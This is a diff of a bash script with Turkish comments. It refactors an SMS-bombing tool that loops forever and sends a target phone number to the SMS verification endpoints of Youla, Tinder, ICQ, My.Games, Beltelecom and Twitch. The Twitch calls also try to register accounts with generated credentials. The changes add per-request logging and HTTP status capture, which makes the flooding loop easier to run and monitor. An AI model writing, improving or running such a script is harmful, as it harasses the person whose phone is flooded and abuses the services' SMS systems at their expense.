@@ -14,59 +14,52 @@ username="${name}$(generate_random_string)"
 
 numplus="+$phone"
 
+# Renk kodları
 colors=( "\033[1;31m" "\033[1;32m" "\033[1;33m" "\033[1;34m" "\033[1;35m" "\033[1;36m" )
 color=${colors[$RANDOM % ${#colors[@]}]}
 
-echo -e "$color"
+# Çıktı dosyası
+log_file="request_log.txt"
+
+# Başlangıçta log dosyasını temizle
+> "$log_file"
+
+# İşlemi durdurmak için tuş kombinasyonu
+trap 'echo "Process interrupted by user."; exit 0' SIGINT
 
 while true; do
-    # 1
-    echo "Sending request to https://youla.ru/web-api/auth/request_code"
-    response=$(curl -s -X POST 'https://youla.ru/web-api/auth/request_code' -H 'Content-Type: application/json' -d "{\"phone\":\"$numplus\"}")
-    echo "$response"
-    sleep 0.5
+    for url in \
+        "https://youla.ru/web-api/auth/request_code" \
+        "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru" \
+        "https://www.icq.com/smsreg/requestPhoneValidation.php?msisdn=$phone&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763" \
+        "https://account.my.games/signup_send_sms/" \
+        "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru" \
+        "https://passport.twitch.tv/register?trusted_request=true"
+    do
+        timestamp=$(date +"%Y-%m-%d %H:%M:%S")
+        echo -e "$color[$timestamp] Sending request to $url"
 
-    # 2
-    echo "Sending request to https://api.gotinder.com/v2/auth/sms/send"
-    response=$(curl -s -X POST 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' -H 'Content-Type: application/json' -d "{\"phone_number\":\"$numplus\"}")
-    echo "$response"
-    sleep 0.5
+        case "$url" in
+            *"twitch.tv"*)
+                response=$(curl -s -w "%{http_code}" -o temp_response.txt -X POST "$url" -H 'Content-Type: application/json' -d "{\"birthday\":{\"day\":11,\"month\":11,\"year\":1999},\"client_id\":\"kd1unb4b3q4t58fwlpcbzcbnm76a8fp\",\"include_verification_code\":true,\"password\":\"$password\",\"phone_number\":\"$phone\",\"username\":\"$username\"}")
+                ;;
+            *)
+                response=$(curl -s -w "%{http_code}" -o temp_response.txt -X POST "$url" -H 'Content-Type: application/json' -d "{\"phone\":\"$numplus\"}")
+                ;;
+        esac
 
-    # 3
-    echo "Sending request to https://www.icq.com/smsreg/requestPhoneValidation.php"
-    response=$(curl -s -X POST "https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn=$phone&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763")
-    echo "$response"
-    sleep 0.5
+        http_code=$(tail -n 1 temp_response.txt)
+        response_body=$(head -n -1 temp_response.txt)
 
-    # 4
-    echo "Sending request to https://account.my.games/signup_send_sms/"
-    response=$(curl -s -X POST 'https://account.my.games/signup_send_sms/' -d "phone=$phone")
-    echo "$response"
-    sleep 0.5
+        echo -e "$color[$timestamp] HTTP Status Code: $http_code"
+        echo "$response_body"
+        echo "[$timestamp] URL: $url" >> "$log_file"
+        echo "HTTP Status Code: $http_code" >> "$log_file"
+        echo "Response Body: $response_body" >> "$log_file"
+        echo "--------------------------------------" >> "$log_file"
 
-    # 5
-    echo "Sending request to https://api.gotinder.com/v2/auth/sms/send"
-    response=$(curl -s -X POST 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' -H 'Content-Type: application/json' -d "{\"phone_number\":\"$phone\"}")
-    echo "$response"
-    sleep 0.5
-
-    # 6
-    echo "Sending request to https://myapi.beltelecom.by/api/v1/auth/check-phone"
-    response=$(curl -s -X POST 'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru' -H 'Content-Type: application/json' -d "{\"phone\":\"$phone\"}")
-    echo "$response"
-    sleep 0.5
-
-    # 7
-    echo "Sending request to https://passport.twitch.tv/register"
-    response=$(curl -s -X POST 'https://passport.twitch.tv/register?trusted_request=true' -H 'Content-Type: application/json' -d "{\"birthday\":{\"day\":11,\"month\":11,\"year\":1999},\"client_id\":\"kd1unb4b3q4t58fwlpcbzcbnm76a8fp\",\"include_verification_code\":true,\"password\":\"$password\",\"phone_number\":\"$phone\",\"username\":\"$username\"}")
-    echo "$response"
-    sleep 0.5
-
-    # 8
-    echo "Sending request to https://api.gotinder.com/v2/auth/sms/send"
-    response=$(curl -s -X POST 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru' -H 'Content-Type: application/json' -d "{\"phone_number\":\"$phone\"}")
-    echo "$response"
-    sleep 0.5
+        sleep 0.5
+    done
 
     # Renk değişimi
     color=${colors[$RANDOM % ${#colors[@]}]}
